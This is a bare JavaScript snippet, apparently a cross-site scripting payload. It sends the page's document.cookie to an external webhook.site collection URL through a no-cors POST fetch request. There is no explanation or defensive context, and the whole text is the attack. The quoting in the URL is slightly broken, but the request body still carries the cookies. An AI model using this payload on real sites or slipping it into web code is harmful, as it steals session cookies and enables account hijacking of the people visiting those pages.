fetch("https://webhook.site/91ae6f9a-ba27-4b42-8717-7acc927c74d7/?c='+document.cookie'", {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
